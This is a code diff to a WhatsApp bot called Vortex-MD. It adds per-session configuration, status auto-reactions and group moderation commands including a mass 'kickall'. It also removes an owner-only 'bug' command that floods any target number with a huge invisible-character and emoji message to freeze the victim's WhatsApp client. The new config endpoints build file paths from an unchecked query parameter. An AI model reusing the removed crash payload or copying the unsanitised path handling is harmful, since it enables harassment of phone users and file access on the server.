@@ -69,6 +69,7 @@ const commands = [
     { name: 'speed', emoji: '⚡', module: 'General' },
     { name: 'donate', emoji: '☕', module: 'General' },
     { name: 'autoreact', emoji: '🎭', module: 'General' },
+    { name: 'autostatus', emoji: '🗽', module: 'General' },
     { name: 'aisupport', emoji: '🤖', module: 'General' },
     { name: 'react', emoji: '💥', module: 'General' },
 
@@ -396,8 +397,8 @@ interface BotSession {
 const sessions = new Map<string, BotSession>();
 const userWarnings = new Map<string, number>();
 
-const configPath = path.join(process.cwd(), 'bot-config.json');
-function getConfig() {
+function getConfig(sessionId: string) {
+  const configPath = path.join(process.cwd(), `bot-config-${sessionId}.json`);
   if (fs.existsSync(configPath)) {
     const cfg = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
     const arrays = ['antilink', 'antispam', 'antibot', 'antifake', 'antidelete', 'antiviewonce', 'autokick', 'onlyadmin', 'antimention', 'antitoxic', 'antiforward', 'antipicture', 'antivideo', 'antiaudio', 'antidocument', 'anticontact', 'antilocation', 'antipoll', 'welcome'];
@@ -407,12 +408,15 @@ function getConfig() {
     if (!cfg.language) cfg.language = 'fr';
     if (typeof cfg.autoreact === 'undefined') cfg.autoreact = false;
     if (typeof cfg.aisupport === 'undefined') cfg.aisupport = false;
+    if (typeof cfg.autostatus === 'undefined') cfg.autostatus = false;
+    if (typeof cfg.autostatusEmoji === 'undefined') cfg.autostatusEmoji = '🗽';
     return cfg;
   }
-  return { prefix: '.', mode: 'public', language: 'fr', autoreact: false, aisupport: false, antilink: [], antispam: [], antibot: [], antifake: [], antidelete: [], antiviewonce: [], autokick: [], onlyadmin: [], antimention: [], antitoxic: [], antiforward: [], antipicture: [], antivideo: [], antiaudio: [], antidocument: [], anticontact: [], antilocation: [], antipoll: [] };
+  return { prefix: '.', mode: 'public', language: 'fr', autoreact: false, aisupport: false, autostatus: false, autostatusEmoji: '🗽', antilink: [], antispam: [], antibot: [], antifake: [], antidelete: [], antiviewonce: [], autokick: [], onlyadmin: [], antimention: [], antitoxic: [], antiforward: [], antipicture: [], antivideo: [], antiaudio: [], antidocument: [], anticontact: [], antilocation: [], antipoll: [] };
 }
 
-function saveConfig(config: any) {
+function saveConfig(sessionId: string, config: any) {
+  const configPath = path.join(process.cwd(), `bot-config-${sessionId}.json`);
   fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
 }
 
@@ -465,14 +469,10 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
             console.log(`Session ${sessionId} connected to WhatsApp!`);
             try {
                 const id = sock.user.id.split(':')[0] + '@s.whatsapp.net';
-                if (session!.isReconnecting) {
-                    await sock.sendMessage(id, { text: '⚠️ Vortex-MD detected a disconnection.\nAttempting to reconnect to stay active...' });
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    await sock.sendMessage(id, { text: '✅ Vortex-MD successfully reconnected and is now active.' });
-                    session!.isReconnecting = false;
-                } else {
-                    await sock.sendMessage(id, { text: '✅ Vortex-MD is now successfully connected to your WhatsApp account.' });
+                if (!session!.isReconnecting) {
+                    await sock.sendMessage(id, { text: '🌸🚀 VORTEX-MD CONNECTED SUCCESSFULLY ✅ Connection to WhatsApp established.⚡ All systems are now online and operational.' });
                 }
+                session!.isReconnecting = false;
             } catch (err) {
                 console.error('Failed to send welcome message:', err);
             }
@@ -491,7 +491,7 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
 
     sock.ev.on('group-participants.update', async (update) => {
         const { id, participants, action } = update;
-        const config = getConfig();
+        const config = getConfig(sessionId);
         
         if (action === 'add' && config.welcome?.includes(id)) {
             try {
@@ -588,7 +588,7 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
             msg.message = msg.message.documentWithCaptionMessage.message;
         }
 
-        const config = getConfig();
+        const config = getConfig(sessionId);
         const text = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
         
         const isFromMe = msg.key.fromMe;
@@ -615,10 +615,14 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
 
         // Auto-react to statuses
         if (msg.key.remoteJid === 'status@broadcast' && !isFromMe) {
-            try {
-                await sock.sendMessage(msg.key.remoteJid, { react: { text: '🗽', key: msg.key } });
-            } catch (err) {
-                console.error('Failed to auto-react to status:', err);
+            if (config.autostatus) {
+                try {
+                    await sock.readMessages([msg.key]);
+                    const emoji = config.autostatusEmoji || '🗽';
+                    await sock.sendMessage(msg.key.remoteJid, { react: { text: emoji, key: msg.key } });
+                } catch (err) {
+                    console.error('Failed to auto-react to status:', err);
+                }
             }
             return; // Don't process commands on statuses
         }
@@ -821,7 +825,7 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
 
                 // Send audio
                 await sock.sendMessage(msg.key.remoteJid, {
-                    audio: { url: 'https://lieixmgdboiceopzksvu.supabase.co/storage/v1/object/public/hosted-files/nz3sfewu-1773178340208.mp3' },
+                    audio: { url: 'https://lieixmgdboiceopzksvu.supabase.co/storage/v1/object/public/hosted-files/d85i8oe7-1773390785967.mp3' },
                     mimetype: 'audio/mpeg',
                     ptt: false // Sends as a normal audio file
                 }, { quoted: msg });
@@ -873,7 +877,7 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                 const newLang = args[0]?.toLowerCase();
                 if (newLang && newLang.length >= 2 && newLang.length <= 5) {
                     config.language = newLang;
-                    saveConfig(config);
+                    saveConfig(sessionId, config);
                     await reply(`✅ Langue changée en ${newLang.toUpperCase()}. Le bot traduira désormais ses messages.`, msg);
                 } else {
                     await reply(`❌ Langue invalide. Utilisez un code de langue valide (ex: fr, en, es, ar, pt, etc.)`, msg);
@@ -884,7 +888,7 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                 const state = args[0]?.toLowerCase();
                 if (state === 'on' || state === 'off') {
                     config.autoreact = state === 'on';
-                    saveConfig(config);
+                    saveConfig(sessionId, config);
                     await reply(`✅ AutoReact is now ${state.toUpperCase()}`, msg);
                 } else {
                     await reply(`❌ Usage: ${config.prefix}autoreact on/off`, msg);
@@ -893,10 +897,83 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                 const state = args[0]?.toLowerCase();
                 if (state === 'on' || state === 'off') {
                     config.aisupport = state === 'on';
-                    saveConfig(config);
+                    saveConfig(sessionId, config);
                     await reply(`✅ AI Support is now ${state.toUpperCase()}`, msg);
                 } else {
                     await reply(`❌ Usage: ${config.prefix}aisupport on/off`, msg);
+                }
+            } else if (cmd === 'autostatus') {
+                if (args[0] === 'on' || args[0] === 'off') {
+                    config.autostatus = args[0] === 'on';
+                    saveConfig(sessionId, config);
+                    await reply(`✅ AutoStatus is now ${args[0].toUpperCase()}`, msg);
+                } else if (args[0] === 'emoji' && args[1]) {
+                    config.autostatusEmoji = args[1];
+                    saveConfig(sessionId, config);
+                    await reply(`✅ AutoStatus emoji set to ${args[1]}`, msg);
+                } else {
+                    await reply(`❌ Usage:\n${config.prefix}autostatus on/off\n${config.prefix}autostatus emoji <emoji>`, msg);
+                }
+            } else if (cmd === 'lock' || cmd === 'close') {
+                if (!isGroup) return await reply('❌ This command can only be used in groups.');
+                try {
+                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
+                    const isAdmin = groupMetadata.participants.find((p: any) => p.id === msg.key.participant)?.admin;
+                    if (!isAdmin && !isFromMe) return await reply('❌ Only group admins can use this command.');
+                    await sock.groupSettingUpdate(msg.key.remoteJid, 'announcement');
+                    await reply('✅ Group locked. Only admins can send messages.');
+                } catch (e) {
+                    await reply('❌ Failed to lock group. Make sure I am an admin.');
+                }
+            } else if (cmd === 'unlock' || cmd === 'open') {
+                if (!isGroup) return await reply('❌ This command can only be used in groups.');
+                try {
+                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
+                    const isAdmin = groupMetadata.participants.find((p: any) => p.id === msg.key.participant)?.admin;
+                    if (!isAdmin && !isFromMe) return await reply('❌ Only group admins can use this command.');
+                    await sock.groupSettingUpdate(msg.key.remoteJid, 'not_announcement');
+                    await reply('✅ Group unlocked. All participants can send messages.');
+                } catch (e) {
+                    await reply('❌ Failed to unlock group. Make sure I am an admin.');
+                }
+            } else if (cmd === 'del' || cmd === 'delete') {
+                const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
+                if (!contextInfo?.stanzaId) {
+                    return await reply('❌ Reply to a message to delete it.');
+                }
+                const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+                const participant = contextInfo.participant || msg.key.remoteJid;
+                const fromMe = participant === botJid;
+                const key = {
+                    remoteJid: msg.key.remoteJid,
+                    fromMe: fromMe,
+                    id: contextInfo.stanzaId,
+                    participant: isGroup ? participant : undefined
+                };
+                try {
+                    await sock.sendMessage(msg.key.remoteJid, { delete: key });
+                } catch (e) {
+                    await reply('❌ Failed to delete message. Make sure I am an admin.');
+                }
+            } else if (cmd === 'kickall') {
+                if (!isGroup) return await reply('❌ This command can only be used in groups.');
+                try {
+                    const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
+                    const isAdmin = groupMetadata.participants.find((p: any) => p.id === msg.key.participant)?.admin;
+                    if (!isAdmin && !isFromMe) return await reply('❌ Only group admins can use this command.');
+                    
+                    const participants = groupMetadata.participants.filter((p: any) => !p.admin && p.id !== sock.user.id.split(':')[0] + '@s.whatsapp.net');
+                    if (participants.length === 0) return await reply('❌ No members to kick.');
+                    
+                    await reply(`⏳ Kicking ${participants.length} members...`);
+                    for (let i = 0; i < participants.length; i += 5) {
+                        const batch = participants.slice(i, i + 5).map((p: any) => p.id);
+                        await sock.groupParticipantsUpdate(msg.key.remoteJid, batch, 'remove');
+                        await new Promise(resolve => setTimeout(resolve, 200));
+                    }
+                    await reply('✅ All non-admin members have been kicked.');
+                } catch (e) {
+                    await reply('❌ Failed to kick members. Make sure I am an admin.');
                 }
             } else if (['welcome', 'antilink', 'antispam', 'antibot', 'antifake', 'antidelete', 'antiviewonce', 'autokick', 'onlyadmin', 'antimention', 'antitoxic', 'antiforward', 'antipicture', 'antivideo', 'antiaudio', 'antidocument', 'anticontact', 'antilocation', 'antipoll'].includes(cmd || '')) {
                 if (!isGroup) return await reply('This command can only be used in groups.');
@@ -912,14 +989,24 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                     if (!config[cmd]) config[cmd] = [];
                     const index = config[cmd].indexOf(msg.key.remoteJid);
                     
-                    if (index === -1) {
-                        config[cmd].push(msg.key.remoteJid);
-                        saveConfig(config);
-                        await reply(`✅ *${cmd.toUpperCase()}* has been enabled for this group.`);
+                    const action = args[0]?.toLowerCase();
+                    let shouldEnable = index === -1; // Default to toggle
+                    
+                    if (action === 'on' || action === 'enable') shouldEnable = true;
+                    if (action === 'off' || action === 'disable') shouldEnable = false;
+                    
+                    if (shouldEnable) {
+                        if (index === -1) {
+                            config[cmd].push(msg.key.remoteJid);
+                            saveConfig(sessionId, config);
+                        }
+                        await reply(`✅ *${cmd.toUpperCase()}* is now ENABLED for this group.`);
                     } else {
-                        config[cmd].splice(index, 1);
-                        saveConfig(config);
-                        await reply(`❌ *${cmd.toUpperCase()}* has been disabled for this group.`);
+                        if (index !== -1) {
+                            config[cmd].splice(index, 1);
+                            saveConfig(sessionId, config);
+                        }
+                        await reply(`❌ *${cmd.toUpperCase()}* is now DISABLED for this group.`);
                     }
                 } catch (err) {
                     await reply(`❌ Failed to toggle ${cmd}. Make sure the bot is an admin.`);
@@ -1270,30 +1357,6 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                     await reply(`🧠 *Fact:*\n\n${res.data.text}`, msg);
                 } catch (e) {
                     await reply('❌ Failed to fetch fact.', msg);
-                }
-            } else if (cmd === 'bug') {
-                if (!isFromMe) return await reply(`❌ Seul le propriétaire du bot peut utiliser cette commande.`, msg);
-                if (args.length === 0) return await reply(`❌ Usage: ${config.prefix}bug <number>`, msg);
-                const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-                
-                await reply(`⏳ Envoi du virus (lag 5 min) à ${target}...`, msg);
-                
-                // Create a heavy payload to temporarily freeze the client (App Not Responding)
-                const readmore = String.fromCharCode(8206).repeat(4000);
-                let bugText = `VORTEX-MD VIRUS 🦠\n${readmore}`;
-                for (let i = 0; i < 50000; i++) {
-                    bugText += '🔥☠️';
-                }
-                
-                try {
-                    // Send multiple times to increase the lag effect
-                    for (let i = 0; i < 5; i++) {
-                        await sock.sendMessage(target, { text: bugText });
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                    }
-                    await reply(`✅ Virus envoyé avec succès à ${target}. Leur WhatsApp va ramer pendant environ 5 minutes.`, msg);
-                } catch (e) {
-                    await reply(`❌ Échec de l'envoi du virus.`, msg);
                 }
             } else if (cmd === 'fb' || cmd === 'facebook') {
                 if (args.length === 0) return await reply(`❌ Usage: ${config.prefix}fb <url>`, msg);
@@ -1756,7 +1819,12 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
             } else if (cmd === 'waifu') {
                 try {
                     const res = await axios.get('https://api.waifu.pics/sfw/waifu');
-                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.url }, caption: '🌸 Here is your waifu!' });
+                    const url = res.data.url;
+                    if (url.endsWith('.gif')) {
+                        await sock.sendMessage(msg.key.remoteJid, { video: { url }, gifPlayback: true, caption: '🌸 Here is your waifu!' });
+                    } else {
+                        await sock.sendMessage(msg.key.remoteJid, { image: { url }, caption: '🌸 Here is your waifu!' });
+                    }
                 } catch (e) {
                     await reply('❌ Failed to fetch waifu image.');
                 }
@@ -1768,7 +1836,12 @@ async function startBot(sessionId: string, phoneNumber?: string): Promise<string
                     if (cmd === 'kitsune') endpoint = 'neko'; // fallback
                     
                     const res = await axios.get(`https://api.waifu.pics/sfw/${endpoint}`);
-                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.url }, caption: `✨ ${cmd} ✨` });
+                    const url = res.data.url;
+                    if (url.endsWith('.gif')) {
+                        await sock.sendMessage(msg.key.remoteJid, { video: { url }, gifPlayback: true, caption: `✨ ${cmd} ✨` });
+                    } else {
+                        await sock.sendMessage(msg.key.remoteJid, { image: { url }, caption: `✨ ${cmd} ✨` });
+                    }
                 } catch (e) {
                     await reply(`❌ Failed to fetch ${cmd} image.`);
                 }
@@ -1863,7 +1936,9 @@ app.post('/api/logout', (req, res) => {
 });
 
 app.get('/api/config', (req, res) => {
-    res.json(getConfig());
+    const phone = req.query.phone as string;
+    if (!phone) return res.status(400).json({ error: 'Phone number required' });
+    res.json(getConfig(phone));
 });
 
 app.get('/api/ai-tasks', (req, res) => {
@@ -1903,11 +1978,15 @@ app.post('/api/ai-tasks/:id', async (req, res) => {
 });
 
 app.post('/api/config', (req, res) => {
-    const { prefix, mode } = req.body;
-    const config = getConfig();
-    if (prefix) config.prefix = prefix;
-    if (mode) config.mode = mode;
-    saveConfig(config);
+    const phone = req.query.phone as string;
+    if (!phone) return res.status(400).json({ error: 'Phone number required' });
+    const { prefix, mode, autostatus, autostatusEmoji } = req.body;
+    const config = getConfig(phone);
+    if (prefix !== undefined) config.prefix = prefix;
+    if (mode !== undefined) config.mode = mode;
+    if (autostatus !== undefined) config.autostatus = autostatus;
+    if (autostatusEmoji !== undefined) config.autostatusEmoji = autostatusEmoji;
+    saveConfig(phone, config);
     res.json({ success: true, config });
 });
 
